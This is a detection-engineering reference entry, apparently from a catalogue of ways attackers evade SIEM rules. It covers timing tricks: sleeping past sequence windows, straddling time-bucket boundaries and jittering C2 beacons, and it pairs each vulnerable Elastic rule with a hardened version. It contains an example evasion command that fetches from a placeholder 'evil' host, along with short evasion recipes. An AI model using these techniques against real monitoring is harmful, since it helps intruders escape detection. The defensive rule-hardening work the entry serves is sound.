---
id: ADE3-007
title: Maxspan Delay, Boundary Straddling, and Beacon Jitter
ade_category: ADE3
ade_subcategory: ADE3-03
mitre_attack:
  - T1071 (Application Layer Protocol)
  - T1105 (Ingress Tool Transfer)
platform: Cross-platform
testable: logic-analysis
---

# Maxspan Delay, Boundary Straddling, and Beacon Jitter

## Summary

Three timing bypasses that exploit *how* a rule bins or sequences time, complementing the slow-and-low threshold evasion in [Correlation Window Evasion](window-evasion.md):

- **Sequence `maxspan` delay** — insert a `sleep` between correlated steps so the second step lands after the sequence window expires.
- **Bucket-boundary straddling** — split activity across a fixed `date_trunc` bucket edge (e.g. 9 events at `HH:MM:59` and 9 at `HH:MM+1:02`) so no single bucket reaches the threshold, even though the events are seconds apart.
- **Beacon jitter** — randomize a C2 interval so statistical/periodicity detections (fixed-interval or narrow delta thresholds) no longer see a regular signal.

All three appear across the Elastic and Sentinel corpus.

## ADE Classification

**Category:** ADE3 — Context Development
**Subcategory:** ADE3-03 — Timing and Scheduling
**Core principle:** binning and sequencing impose artificial time edges the attacker can see and step around. A fixed bucket has boundaries; a sequence has a span; a periodicity model has an expected regularity — each is a timing parameter the attacker manipulates without changing the underlying actions.

## The Pattern

1. **Sleep past `maxspan`** — an EQL/sequence rule requires step B within N seconds of step A; wrapping the second step in `sleep`, `awk 'BEGIN{system("sleep 4 && ...")}'`, or a scheduled delay lets the sequence expire.
2. **Straddle the bucket edge** — a `STATS ... BY DATE_TRUNC(1 minute, @timestamp)` threshold is defeated by placing `N-1` events just before the minute boundary and `N-1` just after; both buckets stay under `N` though the events are contiguous.
3. **Jitter the beacon** — a beaconing detection keyed on a fixed interval or a tight `TimeDeltaThreshold`/`PercentBeaconThreshold` is evaded by randomizing the callback interval (e.g. 30–90 s, or base ± 25% jitter).

## Documented instances (from the analysis corpus)

| Rule (platform) | Timing construct | Bypass |
|---|---|---|
| Network Activity Detected via cat (Elastic) | sequence maxspan | `sleep` between `cat` exec and network redirect |
| Git Repository or File Download to Suspicious Directory (Elastic) | `maxspan` | `wget ...`; `sleep 15`; `mv` the file after the window |
| Curl or Wget Egress via LoLBin (Elastic) | sequence maxspan | `awk 'BEGIN{system("sleep 4 && curl ...")}'` |
| Potential Protocol Tunneling via Chisel Client (Elastic) | sequence maxspan | delay the network connection after client start |
| Potential Shell via Wildcard Injection (Elastic) | sequence timing | `tar --checkpoint-action=exec` with an embedded `sleep` |
| Potential Denial of Azure OpenAI ML Service (Elastic) | `date_trunc` bucket | 9 requests at `00:59:58` + 9 at `01:00:02` |
| M365 OneDrive Excessive File Downloads with OAuth Token (Elastic) | `date_trunc` bucket | 20 files at `10:00:59` + 20 at `10:01:01` |
| M365 Identity OAuth Flow to Device Registration (Elastic) | sequence window | wait 31+ min before exchanging the phished OAuth code |
| Statistical Model Detected C2 Beaconing (Elastic) | periodicity score | randomized 30–90 s beacon defeats the regularity model |
| Potential beaconing activity — ASIM DNS (Sentinel/KQL) | `TimeDeltaThreshold`/`PercentBeaconThreshold` | 20 s interval ± 25% jitter |
| Access to Outlook Mail Files by Uncommon Apps (Sigma) | sequence timing | alter the system clock to break event ordering |

## Vulnerable Rule

```eql
// Paraphrased: LoLBin egress requires the network step within maxspan of exec
sequence by host.id with maxspan=5s
  [process where process.name in ("curl","wget")]
  [network where event.type == "start"]
```

### Why it misses

The 5-second `maxspan` assumes the network connection follows the process start almost immediately. `awk 'BEGIN{system("sleep 4 && curl http://evil")}'` — or any wrapper that delays the connection past 5 s — lets the sequence expire, and no correlated alert is produced even though the download happens.

## Hardened Rule

```eql
sequence by host.id with maxspan=10m          // realistic dwell, not 5s
  [process where process.name in ("curl","wget","awk","python","perl")]
  [network where event.type == "start"]
until [process where event.type == "end" and process.name == "sleep"]
```

Widen `maxspan` to a realistic dwell time (or decouple the steps into stateful detections joined on a stable key so a `sleep` cannot expire them); for bucketed thresholds use **sliding/overlapping windows** so boundary-straddling still accumulates; for beaconing, model jitter tolerance (delta *distribution*, not a fixed interval).

## Detection Layers

| Audit method | Catches these timing tricks? | How |
|---|---|---|
| Realistic/decoupled `maxspan` | Yes | A `sleep` no longer expires the sequence |
| Sliding/overlapping windows | Yes | Boundary-straddling events fall in a shared window |
| Jitter-tolerant beaconing model | Yes | Model the delta distribution, not a fixed period |
| Anchor sequences on stable keys, not "immediate next event" | Partial | Reused/long-lived processes still correlate |
| Emulate sleep / straddle / jitter | Yes | Reproduce each; confirm coverage |

## Implementation Nuances

- This file covers the *mechanics of time binning/sequencing*; the threshold-per-window slow-and-low case is in the sibling [Correlation Window Evasion](window-evasion.md).
- Boundary straddling is simultaneously an [ADE3-02 aggregation hijack](../ADE3-02-aggregation-hijacking/baseline-and-threshold-hijacking.md) — the fixed bucket is the aggregation and the boundary is the timing.
- See [Implementation Nuances #6](../../../bug_patterns/logging_assumption_errors.md) (correlation timeframes) and #22 (clock skew / clock tampering can reorder or drop sequence events — normalize to UTC and treat clock manipulation as its own signal).

## References

- [MITRE ATT&CK T1071 — Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)
- [MITRE ATT&CK T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [Elastic detection-rules](https://github.com/elastic/detection-rules) · [Azure-Sentinel](https://github.com/Azure/Azure-Sentinel)
